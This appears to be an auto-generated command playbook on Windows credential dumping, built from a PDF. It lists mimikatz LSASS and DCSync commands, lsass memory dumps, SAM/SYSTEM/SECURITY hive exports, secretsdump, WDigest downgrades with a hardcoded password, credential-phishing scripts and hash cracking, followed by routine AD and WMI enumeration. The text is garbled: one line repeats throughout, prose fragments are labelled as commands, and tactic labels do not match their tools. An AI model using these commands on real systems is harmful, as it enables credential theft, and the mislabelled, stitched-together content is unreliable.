---
title: "Trained Command Playbook: credential dumping"
category: commands
domain_hub: "[[knowledge/04_windows_powershell_wmi_cim_and_active_directory]]"
os_platform: windows
primary_tactic: Active_Enum
summary: "Verified Windows & Linux command playbook for credential dumping (Active_Enum): PowerShell 2.0-7+ cmdlets, Get-CimInstance/Get-WmiObject/wmic queries, WinRM/PSRemoting (Invoke-Command, Enter-PSSession), Active Direc"
when_to_apply: "Apply when working with credential dumping (windows): Apply when automating Windows enumeration with PowerShell or WMI/CIM (`Get-CimInstance`/`wmic`), executing commands remotely via WinRM/WMI, enumerating Active Directory users/groups/computers/trusts/GPOs (`dsquery`/`nltest`/`net`), or auditing Kerberos tickets (`klist`) and SPNs (`setspn`)."
tags: [covert_exfil, credential_access, defense_evasion_firewall, enumeration, http, https, impacket, john, kerberos, lateral_movement_routing_pivot, mdp, mimikatz, netsh, nmap, out-of-band_access, pdf, powershell, privilege_escalation, ssh, sysinternals, trained, windows]
source_file: "credential dumping"
updated: 2026-10-30
---

powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
# Trained Command Playbook: `credential_dumping.pdf`
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
- **Source Document:** `~/Projects/CORA/Training/credential_dumping.pdf`
- **CEGAR Verified Commands:** `81` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `81`
- **Discovered IPs/Subnets:** `172.24.0.102, 172.24.1.103, 172.24.1.105, 172.24.1.108, 172.24.1.112`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_credential_dumping]]
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `netsh` | `s_credentials_or_certs_acquired` | `netsh wlan show profiles` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `privilege::debug` | `s_interactive_tty_or_priv_escalated` | `privilege::debug` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `import-module` | `s_covert_exfil_verified` | `Import-Module .\WdigestDowngrade.ps1` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `crackmapexec` | `s_oob_serial_enumerated` | `crackmapexec smb 172.24.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable` |
| `s_oob_serial_enumerated` | **`Defense_Evasion_Firewall`** | Host Firewall, Audit Policy, LOLBin & Integrity Control Adjustment | `rundll32` | `s_firewall_or_acl_unlocked` | `RunDll32.exe user32.dll,LockWorkStation` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `python` | `s_active_services_enumerated` | `python -m SimpleHTTPServer` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.0.102` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `netsh` | `s_credentials_or_certs_acquired` | `netsh wlan show profile name=<SSID Name> key=clear` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `token::elevate` | `s_interactive_tty_or_priv_escalated` | `token::elevate` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `invoke-wdigestdowngrade` | `s_covert_exfil_verified` | `Invoke-WdigestDowngrade` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `crackmapexec` | `s_oob_serial_enumerated` | `crackmapexec smb 172.24.1.105 -u 'Administrator' -p` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.0.102 110` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `r2` | `s_credentials_or_certs_acquired` | `R2 Domain Controller.` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg query` |
| `s_l2_l3_verified` | **`Out-of-Band_Access`** | UART/Serial Console Out-of-Band Enumeration & Control | `crackmapexec` | `s_oob_serial_enumerated` | `crackmapexec smb 172.24.1.105 -u` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.0.102 25` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `smbclient` | `s_credentials_or_certs_acquired` | `smbclient //172.24.1.103/SYSVOL -U raj` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\sam c:\sam` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `import-module` | `s_credentials_or_certs_acquired` | `Import-Module .\Get-GPPPassword.ps1` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `get-gpppassword` | `s_credentials_or_certs_acquired` | `Get-GPPPassword` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `type` | `s_covert_exfil_verified` | `type <pwdump file name>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `reg` | `s_credentials_or_certs_acquired` | `reg add` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `ntdsutil` | `s_covert_exfil_verified` | `NTDSutil.exe with a bunch of parameters instructing it to make a directory called temp in the C:\ drive` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `sekurlsa::wdigest` | `s_credentials_or_certs_acquired` | `sekurlsa::wdigest` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `secretsdump.py` | `s_covert_exfil_verified` | `./secretsdump.py -ntds /root/ntds.dit -system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `ip` | `s_credentials_or_certs_acquired` | `IP Address: 172.24.1.105` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save HKLM\SYSTEM system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `reg` | `s_credentials_or_certs_acquired` | `reg query hklm\system\currentcontrolset\control\lsa /v "Security Packages"` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save HKLM\security` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `type` | `s_credentials_or_certs_acquired` | `type C:\Windows\System32\kiwissp.log` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\system c:\system` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `misc::memssp` | `s_credentials_or_certs_acquired` | `misc::memssp` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `reg` | `s_covert_exfil_verified` | `reg save hklm\security c:\security` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `type` | `s_credentials_or_certs_acquired` | `type C:\Windows\System32\mimilsa.log` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `python` | `s_covert_exfil_verified` | `python secretsdump.py -security -system system LOCAL` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `type` | `s_credentials_or_certs_acquired` | `type mimilsa.log` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `mimikatz` | `s_credentials_or_certs_acquired` | `mimikatz folder to the system32 folder in the target system. To do so, simply go to the mimikatz folder` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `import-module` | `s_credentials_or_certs_acquired` | `Import-Module <'path of the powerdump script'>` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `invoke-powerdump` | `s_credentials_or_certs_acquired` | `Invoke-PowerDump` |
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
## Verified Executable Commands (Grouped by Capability Layer)
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
### General_System (67 commands)
```bash
R2 Domain Controller.
smbclient //172.24.1.103/SYSVOL -U raj
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
privilege::debug
reg add
sekurlsa::wdigest
Import-Module .\WdigestDowngrade.ps1
Invoke-WdigestDowngrade
reg query
crackmapexec smb 172.24.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable
reg query hklm\system\currentcontrolset\control\lsa /v "Security Packages"
type C:\Windows\System32\kiwissp.log
misc::memssp
type C:\Windows\System32\mimilsa.log
RunDll32.exe user32.dll,LockWorkStation
type mimilsa.log
mimikatz folder to the system32 folder in the target system. To do so, simply go to the mimikatz folder
python -m SimpleHTTPServer
reg save hklm\sam c:\sam
reg save hklm\system
Import-Module <'path of the powerdump script'>
Invoke-PowerDump
token::elevate
lsadump::sam
./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL
crackmapexec smb 172.24.1.105 -u 'Administrator' -p
john -format=NT hash -show
type <pwdump file name>
NTDSutil.exe with a bunch of parameters instructing it to make a directory called temp in the C:\ drive
./secretsdump.py -ntds /root/ntds.dit -system
Set-ExecutionPolicy Unrestricted
Import-Module DSInternals
Get-BootKey -SystemHivePath 'C:\SYSTEM'
Get-ADDBAccount -All -DBPath 'C:\ntds.dit' -Bootkey
crackmapexec smb 172.24.1.105 -u
john --format=NT hash --show
Import-Module C:\Users\raj\Desktop\Invoke-
Invoke-CredentialsPhish
Invoke-LoginPrompt.ps1
./lockphish.sh
sekurlsa::minidump
sekurlsa::logonpasswords
procdump.exe -accepteula -ma lsass.exe
sekurlsa::minidump C:\Users\raj\Downloads\Procdump\mem.dmp
Get-Process lsass
sekurlsa::minidump C:\mem.dmp
sekurlsa::longonpasswords
lsadump::lsa /patch
lsadump::secrets
reg save HKLM\SYSTEM system
reg save HKLM\security
lsadump::secrets/system:c:\system /security:c:\security
lsadump::dcsync /domain:ignite.local
Import-Module AdmPwd.PS
Update-AdmPwdADSchema
Set-AdmPwdComputerSelfPermission -OrgUnit Tech
Set-AdmPwdReadPasswordPermission -OrgUnit Tech -AllowedPrincipals Administrators
reg save hklm\system c:\system
reg save hklm\security c:\security
python secretsdump.py -security -system system LOCAL
lsadump::cache
python mscache.py --security /root/Desktop/security
john --format=mscasch2 --wordlist=/usr/share/wordlists/rockyou.txt mhash
john _netntlmv2
psql -h 172.24.0.102 -U raj
mysql -h 172.24.0.102 -u root -p
```
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
### L3_Routing_NAT (3 commands)
```bash
netsh wlan show profiles
netsh wlan show profile name=<SSID Name> key=clear
IP Address: 172.24.1.105
```
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
### L4_Port_Service (11 commands)
```bash
nmap -p21 <ip address>
nmap -p23<ip address>
telnet 172.24.0.102
nmap -p5900 <ip address>
nmap -p445 <ip address>
nmap -p110 <ip address>
telnet 172.24.0.102 110
nmap -p25 <ip address>
telnet 172.24.0.102 25
nmap -p5432 <ip address>
nmap -p3306 <ip address>
```
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `credential dumping`

> **Domain Hub:** [[knowledge/04_windows_powershell_wmi_cim_and_active_directory|Domain Hub 04: Windows PowerShell, WMI/CIM, WinRM Remoting, Active Directory (dsquery), Kerberos & Post-Exploitation]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when automating Windows enumeration with PowerShell or WMI/CIM (`Get-CimInstance`/`wmic`), executing commands remotely via WinRM/WMI, enumerating Active Directory users/groups/computers/trusts/GPOs (`dsquery`/`nltest`/`net`), or auditing Kerberos tickets (`klist`) and SPNs (`setspn`).  
> **15-Engine H-MDP State Transition:** `s_active_services_enumerated` $\xrightarrow{\text{Active_Enum}}$ `s_credentials_or_certs_acquired` | **Bayesian Root-Cause Triggers:** `ad_domain_trust_or_spn_exposure, winrm_or_wmi_lateral_movement_path, kerberos_ticket_or_delegation_weakness, unquoted_service_or_gpo_misconfig` | **Isolation:** `RED, BLUE (Active Directory / WinRM network queries require allowed LAN interface; local CIM/WMI works in WHITE)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem \| Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"` | **PowerShell** | Queries `Win32_ComputerSystem` via modern CIM (WS-Man/DCOM) for host domain membership, logged-on console user, and hardware model. | Apply in PowerShell 4.0+ as the fast, structured replacement for `wmic computersystem` (`[[knowledge/trained_ps_get-cim]]`). | `hostnamectl && lscpu && free -h` |
| `powershell -NoProfile -Command "Get-CimInstance Win32_Service \| Where-Object {$_.State -eq 'Running' -and $_.PathName -notmatch 'C:\\Windows'} \| Select-Object Name,DisplayName,StartName,PathName"` | **PowerShell** | Finds all running third-party/custom Windows services whose binary path is outside `C:\Windows`. | Apply to quickly isolate non-OS services and inspect their execution account (`StartName`) and binary path. | `systemctl list-units --type=service --state=running` |
| `powershell -NoProfile -Command "Get-CimInstance -Namespace root\subscription -ClassName __EventFilter; Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer; Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"` | **PowerShell** | Audits the `root\subscription` WMI repository for permanent WMI Event Filters, Consumers, and Bindings. | Apply to detect fileless WMI persistence (`[[knowledge/trained_us-15-graeber-abusing-windows-management-instrumentation-wmi-to-]]`). | `crontab -l && systemctl list-timers --all` |
| `wmic /node:"<TARGET_IP>" process call create "cmd.exe /c ipconfig /all > C:\Temp\out.txt"` | **Windows CMD** | Executes a command remotely on `<TARGET_IP>` over DCOM/RPC (`TCP 135` + dynamic high ports) using WMI `Win32_Process.Create`. | Apply for agentless remote execution across domain hosts when WinRM (`5985`) is closed but RPC (`135`) is open. | `ssh <USER>@<TARGET_IP> 'ip -4 -br addr'` |
| `winrm enumerate winrm/config/listener && powershell -NoProfile -Command "Test-WSMan -ComputerName <TARGET_IP>"` | **CMD / PS** | Enumerates local WinRM listeners (`5985` HTTP / `5986` HTTPS) and tests WS-Management reachability on `<TARGET_IP>`. | Apply before running `Invoke-Command` or `Enter-PSSession` (`[[commands/trained_powershell-remoting]]`). | `nc -zv <TARGET_IP> 22` |
| `powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { hostname; whoami /all; Get-NetIPConfiguration }"` | **PowerShell** | Executes a PowerShell script block on remote host `<TARGET_IP>` over WinRM (`TCP 5985`/`5986`) and returns serialized objects. | Apply for multi-host administrative command execution and remote triage. | `ssh <USER>@<TARGET_IP> 'hostname; id; ip addr'` |
| `nltest /dclist: && nltest /domain_trusts /all_trusts` | **Windows CMD** | Discovers all Domain Controllers in the current domain and enumerates all forest/external/transitive domain trusts. | Apply first during Active Directory reconnaissance (`[[commands/trained_domain_service_tools]]`). | `dig _ldap._tcp.dc._msdcs.<DOMAIN> SRV` |
| `net user /domain && net group "Domain Admins" /domain && net group "Enterprise Admins" /domain` | **Windows CMD** | Queries the Domain Controller for all domain user accounts and members of high-privilege administrative groups. | Apply on any domain-joined workstation/server to map privileged accounts (`[[commands/trained_net_cmds_1]]`). | `ldapsearch -x -H ldap://<DC_IP> -b 'dc=domain,dc=local'` |
| `dsquery user -limit 0 \| dsget user -samid -sid -upn -pwdneverexpires -disabled && dsquery computer -limit 0` | **Windows CMD (AD)** | Queries Active Directory LDAP for all user accounts (with SAMID, SID, and password expiry flags) and all domain computers (`[[commands/trained_ds_cmds]]`). | Apply when RSAT or DC tools are present to export complete Active Directory object inventories. | `ldapsearch -LLL -H ldap://<DC_IP> '(objectClass=user)' sAMAccountName objectSid` |
| `setspn -Q */* && klist` | **Windows CMD** | Lists all Service Principal Names (`SPNs`) registered in Active Directory (`setspn -Q */*`) and inspects cached Kerberos tickets (`klist`). | Apply to locate SQL/HTTP/Exchange service accounts (`Kerberoasting` audit) and verify active TGT/TGS encryption types (`[[knowledge/trained_kerberos_attacks_cheatsheet]]`). | `klist && kvno <SPN>` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [PowerShell] Queries `Win32_ComputerSystem` via modern CIM (WS-Man/DCOM) for host domain membership, logged-on console user, and hardware model.
powershell -NoProfile -Command "Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,Manufacturer,Model,UserName,TotalPhysicalMemory"
# [PowerShell] Finds all running third-party/custom Windows services whose binary path is outside `C:\Windows`.
powershell -NoProfile -Command "Get-CimInstance Win32_Service | Where-Object {$_.State -eq 'Running' -and $_.PathName -notmatch 'C:\\Windows'} | Select-Object Name,DisplayName,StartName,PathName"
# [PowerShell] Audits the `root\subscription` WMI repository for permanent WMI Event Filters, Consumers, and Bindings.
powershell -NoProfile -Command "Get-CimInstance -Namespace root\subscription -ClassName __EventFilter; Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer; Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"
# [Windows CMD] Executes a command remotely on `<TARGET_IP>` over DCOM/RPC (`TCP 135` + dynamic high ports) using WMI `Win32_Process.Create`.
wmic /node:"<TARGET_IP>" process call create "cmd.exe /c ipconfig /all > C:\Temp\out.txt"
# [CMD / PS] Enumerates local WinRM listeners (`5985` HTTP / `5986` HTTPS) and tests WS-Management reachability on `<TARGET_IP>`.
winrm enumerate winrm/config/listener && powershell -NoProfile -Command "Test-WSMan -ComputerName <TARGET_IP>"
# [PowerShell] Executes a PowerShell script block on remote host `<TARGET_IP>` over WinRM (`TCP 5985`/`5986`) and returns serialized objects.
powershell -NoProfile -Command "Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { hostname; whoami /all; Get-NetIPConfiguration }"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
